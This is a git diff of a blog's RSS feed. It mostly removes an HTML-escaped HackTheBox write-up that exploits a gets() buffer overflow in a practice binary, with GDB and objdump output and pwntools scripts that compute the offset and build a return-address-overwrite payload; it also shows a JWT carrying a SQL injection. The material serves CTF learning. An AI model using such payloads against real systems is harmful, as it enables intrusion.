@@ -3010,7 +3404,7 @@ eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIHNlbGVjdCA
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Wed, 03 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Wed, 03 Jan 2024 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//under-construction-htb</link>
         <link href="http://localhost:4000/under-construction-htb"/>
         <guid isPermaLink="true">http://localhost:4000/under-construction-htb</guid>
@@ -3192,366 +3586,10 @@ root.txt
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Sun, 31 Dec 2023 00:00:00 +0000</pubDate>
+        <pubDate>Sun, 31 Dec 2023 00:00:00 -0300</pubDate>
         <link>http://localhost:4000//jerry-htb</link>
         <link href="http://localhost:4000/jerry-htb"/>
         <guid isPermaLink="true">http://localhost:4000/jerry-htb</guid>
-      </item>
-    
-      <item>
-        <title>You know 0xDiablos? - HackTheBox</title>
-        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;In this write-up, we are going to be taking a closer look at the &lt;em&gt;You Know 0xDiablos&lt;/em&gt; challenge on &lt;a href=&quot;https://app.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt;. We can download the challenge files and test them in our own machine; but to solve it, we need to use netcat.&lt;/p&gt;
-
-&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
-
-&lt;p&gt;The challenge description says:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Description&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;I missed my flag&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;In order to better understand this, let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; to connect to the machine:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 167.99.82.136 31251
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-hi mom
-hi mom
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This really looks like a buffer overflow problem. From what it looks like, we pass a stdin value and get it back. Let’s download the files and investigate this further.&lt;/p&gt;
-
-&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
-
-&lt;p&gt;As always, let’s keep our mindset:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
-  &lt;li&gt;Understanding the problem&lt;/li&gt;
-  &lt;li&gt;Crafting an attack&lt;/li&gt;
-  &lt;li&gt;Solving&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;After downloading the file, we see that it has the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; and we get:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file vuln
-vuln: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ab7f19bb67c16ae453d4959fba4e6841d930a6dd, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, not stripped
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;showing us it is an ELF-32 executable. We might need to get our sleeves dirty using GDB in order to understand what is happening under the hoods.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
-
-&lt;p&gt;Alright, but what are an ELF-32 bit executable and GDB?&lt;/p&gt;
-
-&lt;h3 id=&quot;elf-file&quot;&gt;ELF file&lt;/h3&gt;
-
-&lt;p&gt;An ELF-32 bit LSB executable file can be broken down to:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;ELF:&lt;/strong&gt; Stands for Executable and Linkable Format. Put into simple terms, it is the Linux version of an .exe file. It’s a standard file format for executable files, shared libraries, and core dumps on Linux and other Unix-like operating systems.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;32bit&lt;/strong&gt;: This indicates the architecture for which the file is combiled. 32bit mean its use is for a 32bit architecture, in contrast of being for a 64bit.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;LSB&lt;/strong&gt;: Or Least Significant Bit, refers to the endianness of the file. LSB means that the least significant byte of a word is stored in the smallest address. This means it works with little-endian format.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The fact that this ELF is not stripped also tells us we can possibly debug it into assembly, or even C.&lt;/p&gt;
-
-&lt;h2 id=&quot;gdb&quot;&gt;GDB&lt;/h2&gt;
-
-&lt;p&gt;GDB (GNU Debugger) is a debugger, often used as a reverse engineering tool, that runs on many Unix-like systems and works with numerous programming languages. It essentially allows us to grasp the program’s code in an assembly-like format to understand its flow.&lt;/p&gt;
-
-&lt;p&gt;Let’s see how we can use it. To start analyzing an executable, we run:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./&amp;lt;executable&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This will open up the GDB CLI in your terminal. When inside, we need to know some basic commands:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run/r&lt;/code&gt;: to run the program as it is.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;break/b *&amp;lt;address/function&amp;gt;&lt;/code&gt;: sets a breakpoint. GDB will pause the execution of the program when it reaches this point.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/20x &amp;lt;register&amp;gt;&lt;/code&gt;: displays the content of memory at a given address.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;continue/c&lt;/code&gt;: continues execution flow of the program.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stepi&lt;/code&gt;: jumps to the next instruction in the stack.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disassemble&lt;/code&gt;: disassembles current function.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This will make more sense once we start analyzing the binary ELF file.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
-
-&lt;p&gt;First, let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objdump&lt;/code&gt; to get the assembly instructions of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; vuln
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This will give a huge assembly dump. What it is most interesting here are the following functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; function is called from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; at this address:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-8049301:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
-8049304:       8d 83 38 e0 ff ff         lea    &lt;span class=&quot;nt&quot;&gt;-0x1fc8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
-804930a:       50                      push   %eax
-804930b:       e8 60 fd ff ff            call   8049070 &amp;lt;puts@plt&amp;gt;
-8049310:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
-8049313:       e8 5a ff ff ff             call   8049272 &amp;lt;vuln&amp;gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; is called, we get to the point where it asks for our stdin input:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-8049290:       50                      push   %eax
-8049291:       e8 aa fd ff ff            call   8049040 &amp;lt;gets@plt&amp;gt;
-8049296:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
-8049299:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
-804929c:       8d 85 48 ff ff ff          lea    &lt;span class=&quot;nt&quot;&gt;-0xb8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
-80492a2:       50                      push   %eax
-80492a3:       e8 c8 fd ff ff            call   8049070 &amp;lt;puts@plt&amp;gt;
-80492a8:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
-80492ab:       90                      nop
-80492ac:       8b 5d &lt;span class=&quot;nb&quot;&gt;fc                &lt;/span&gt;mov    &lt;span class=&quot;nt&quot;&gt;-0x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%ebx
-80492af:       c9                      leave
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Since there is nowhere in the instructions a call to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function, we might need to inject a call ourselves within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets@plt&lt;/code&gt;, which is vulnerable to buffer overflow. We just need to know how much allocated memory is reserved to the buffer pointed by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%esp&lt;/code&gt;, which is our input. If succeeded, we can overflow the stack and overwrite the return address to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;p&gt;The interesting parts of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; functions are:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
- 8049205:       e8 a6 fe ff ff            call   80490b0 &amp;lt;fopen@plt&amp;gt;
- 804920a:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
- 804920d:       89 45 f4                mov    %eax,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8049210:       83 7d f4 00             cmpl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,-0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8049214:       75 1c                   jne    8049232 &amp;lt;flag+0x50&amp;gt;
- 8049216:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
- 8049219:       8d 83 14 e0 ff ff         lea    &lt;span class=&quot;nt&quot;&gt;-0x1fec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
- 804921f:       50                      push   %eax
- 8049220:       e8 4b fe ff ff            call   8049070 &amp;lt;puts@plt&amp;gt;
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
- 8049232:       83 ec 04                sub    &lt;span class=&quot;nv&quot;&gt;$0x4&lt;/span&gt;,%esp
- 8049235:       ff 75 f4                 push   &lt;span class=&quot;nt&quot;&gt;-0xc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8049238:       6a 40                   push   &lt;span class=&quot;nv&quot;&gt;$0x40&lt;/span&gt;
- 804923a:       8d 45 b4                lea    &lt;span class=&quot;nt&quot;&gt;-0x4c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
- 804923d:       50                      push   %eax
- 804923e:       e8 0d fe ff ff            call   8049050 &amp;lt;fgets@plt&amp;gt;
- 8049243:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
- 8049246:       81 7d 08 ef be ad de    cmpl   &lt;span class=&quot;nv&quot;&gt;$0xdeadbeef&lt;/span&gt;,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 804924d:       75 1a                   jne    8049269 &amp;lt;flag+0x87&amp;gt;
- 804924f:       81 7d 0c 0d d0 de c0    cmpl   &lt;span class=&quot;nv&quot;&gt;$0xc0ded00d&lt;/span&gt;,0xc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- 8049256:       75 14                   jne    804926c &amp;lt;flag+0x8a&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We get to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt; fucntion, which is seemingly openning a text file and reading its contents. Then, at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08049214&lt;/code&gt; we are jumping to the next part of the code, if openning the file was successful. Within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmpl&lt;/code&gt; instructions, we are comparing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$0xdeadbeef&lt;/code&gt; with whatever is stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x8(%ebp)&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$0xc0ded00d&lt;/code&gt; with what is stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xc(%ebp)&lt;/code&gt;. If they match, then we continue to this:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-8049258:       83 ec 0c                sub    &lt;span class=&quot;nv&quot;&gt;$0xc&lt;/span&gt;,%esp
-804925b:       8d 45 b4                lea    &lt;span class=&quot;nt&quot;&gt;-0x4c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%ebp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
-804925e:       50                      push   %eax
-804925f:       e8 cc fd ff ff            call   8049030 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
-8049264:       83 c4 10                add    &lt;span class=&quot;nv&quot;&gt;$0x10&lt;/span&gt;,%esp
-8049267:       eb 04                   jmp    804926d &amp;lt;flag+0x8b&amp;gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;which prints the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
-
-&lt;p&gt;To have this to work, we need to find the exact offset to which we overflow the buffer and inject a call to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function. To calculate the offset, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; in Python and create a cycled input. This will calculate a rough estimate of how many bytes we need to overflow and inject a call. A simple Python script should do the job:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Let’s create a file with this as a payload to be passed to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; executable. We can run:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 cycle.py &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; cycle.txt
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cycle.txt 
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Now, we  need to pass this as a payload to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt; executable and examine at what address the program crashes. To help us with that, we will use GDB: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb ./vuln&lt;/code&gt;. Once inside, we run with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r &amp;lt; cycle.txt&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r &amp;lt; cycle.txt
-Starting program: /tmp/htb/vuln &amp;lt; cycle.txt
-Downloading separate debug info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;system-supplied DSO at 0xf7fc7000                  
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Thread debugging using libthread_db enabled]                                          
-Using host libthread_db library &lt;span class=&quot;s2&quot;&gt;&quot;/usr/lib/libthread_db.so.1&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-You know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;are 0xDiablos: 
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
-
-Program received signal SIGSEGV, Segmentation fault.
-0x62616177 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ok, the stack crashed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x62616177&lt;/code&gt;. Now, we can calculate the offset by giving this address to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwntools&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic_find&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;eip_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61776261&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;cyclic_find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eip_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;The offset: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Gives:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;htb-venv&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 offset.py 
-The offset: 186
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So the offset is roughly 186. I say roughly, because this method does not always work, but it always gives a rough estimate. Now it’s time to investigate it further with GDB. Let’s try to see if we can delivery a payload with this offset and containing the address of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt; function to be called. We could start with this payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -c &quot;import sys; sys.stdout.buffer.write(b&apos;A&apos;*186 + &amp;lt;flag function address&amp;gt;)&quot;&lt;/code&gt;, where in this case, the function address is: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x080491e2&lt;/code&gt;. Since we are in a little-endian system, we write the payload as follows:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;186&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe2\x91\x04\x08&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Let’s write the output to a binary file:&lt;/p&gt;
-
